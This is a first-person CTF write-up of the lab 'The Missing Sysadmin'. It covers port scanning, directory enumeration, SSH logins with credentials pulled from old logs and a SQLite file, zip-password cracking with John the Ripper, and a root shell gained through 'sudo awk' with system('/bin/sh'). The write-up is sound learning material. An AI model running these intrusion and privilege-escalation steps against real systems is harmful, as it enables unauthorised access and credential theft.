# The Missing Sysadmin

Author: Michael Gahm
Date: 2026-01-21

This is my first writeup of a completed CTF challenge.

So this is a CTF, called "The Missing Sysadmin" by Björn Ettelman

<img width="640" height="480" alt="image" src="https://github.com/user-attachments/assets/f41fc666-4139-4704-9742-06e5fe3aaac3" />

So how do i start gathering information?

Let's begin with an basic nmap scan to check for open ports.

`❯ nmap <IP>`

The results shows only three open ports:

```bash
nmap 10.3.10.xxx
Starting Nmap 7.92 ( https://nmap.org ) at 2025-11-18 12:03 CET
Nmap scan report for 10.3.10.xxx
Host is up (0.066s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.65 ((Debian))
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 3.05 seconds
```

Visiting the page and inspecting the code shows no clues on how to breach, and there are no /robots.txt available.
So whats on the port 5000? It shows a scoreboard and a endpoint of /submit to add your flags..

Let's crawl the website for hidden files with gobuster

`gobuster dir -x html -u http://10.3.10.xxx/ -w /wordlist-big.txt`

After a while it shows up some results:

```
Starting gobuster in directory enumeration mode

index.html           (Status: 200) [Size: 5569]
status.html          (Status: 200) [Size: 637]
```
<br>
The index.html is irrelevant, but *status.html* is interresting, lets check it out:
<img width="828" height="153" alt="image" src="https://github.com/user-attachments/assets/7b31cfe2-d8e7-4cd8-a064-8a7bf4e40e43" />

Now it looks like we got an entry-point on ssh? Lets try:

`ssh trainee@10.3.10.xxx` and entering the password 'training123'

There we go, first entrance!

```
❯ ssh trainee@10.3.10.xxx
Welcome to The Missing Sysadmin!
trainee@10.3.10.xxx's password: 
Linux TheMissingSysadmin 6.12.41+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.41-1 (2025-08-12) x86_64

--SNIP--

trainee@TheMissingSysadmin:~$ ls
flag.txt  notes
```
so one textfile and a folder, nothing useful in the hidden files either.

`❯ cat flag.txt`
atleast reveals the first flag!

but there are also a directory named *notes* with an subfolder *old_logs* containing a lot of old log-files.
Aaah, the webpage mentioned "check old logs"..

Viewing the first one shows a lot of login logs... lets se if we can extract some credentials...

`❯ cat *.log | grep "pass="` to list them all and only show lines containing *pass=*

Looks like a lot of login attempts, a brute force attack?
However, one line sticks out: `login user=webbackup pass=coffe2025`

Let's try to ssh to it:

`❯ ssh webbackup@10.3.10.xxx` <br>
and entering the password 'coffee2025'

Allright, second entrance!
`sudo -l` and other common privescs shows nothing interresting.
so there must be something in the tar-archive:

```
webbackup@TheMissingSysadmin:~$ ls
webserver_backup.tar.gz
```

Downloading it and extracting reveals a flag.txt and a README.txt
YES! One more flag collected!!

Let's check the README:
```bash
cat README.txt
This is an archived snapshot of the old webserver.
You might find credentials in the site database: site.db
```

An easy way to exctract data from database is to do a strings:

```
strings site.db
SQLite format 3
tableusersusers
CREATE TABLE users(id INTEGER PRIMARY KEY, username TEXT, password TEXT)
%othernot_this_one
-crypto--REDACTED--
```
That reveals an user 'crypto' with password '--REDACTED--'.

Let's try to ssh to it using `ssh crypto@10.3.10.xxx` and entering the password '--REDACTED--'
```

```bash
❯ ssh crypto@10.3.10.251
Welcome to The Missing Sysadmin!
crypto@10.3.10.251's password: 
Linux TheMissingSysadmin 6.12.41+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.41-1 (2025-08-12) x86_64

--SNIP--

crypto@TheMissingSysadmin:~$ ls
web_secret.zip
crypto@TheMissingSysadmin:~$
```
Lets download and extract the zip-file!<br>
Of course, it's password protected.

All right, lets try to use crack it by using johntheripper, i'm not gonna<br>
write all the commands here but guide through the process:
- first use `zip2john` on the zip-file to create a crackable hash that `john` recognizes.
- secondly, use `john` with your passwordlist of choice to brute force the hash.
- if success, you should now have a outputfile named `john.pot` containing the password.
- lastly, use the password to extract the zip-file.

Now we got a new file `secret_message.txt`.

```bash
❯ cat secret_message.txt
The sysadmin never trusted password managers...
Username: sysadmin
Password: --redacted--
FLAG{--REDACTED--}
```

YES! Another flag collected! Lets explore next user.

As always, start with basic privesc for the user.<br>
My first goto-command is `sudo -l` which gives me:

```bash
sysadmin@TheMissingSysadmin:~$ sudo -l
Matching Defaults entries for sysadmin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User sysadmin may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/awk
```
Hmm.. let's check the output a bit. Apparently the user can run `awk` as root without password. 
Checking BTFObins informs me that this can give me a root shell by running:
```bash
sysadmin@TheMissingSysadmin:~$ sudo awk 'BEGIN {system("/bin/sh")}'
# whoami
root
```
Finally, i'm **root** on the machine, so lets collect the final flag:

```
# pwd
/home/sysadmin
# cd /root
# ls
nohup.out  root.txt  visitors.txt
# cat root.txt  
FLAG{--REDACTED--}
```
<br><br><br><br>
CONCLUSION:

ROOT OWNS THE WORLD

This CTF was really fun and I learned alot.
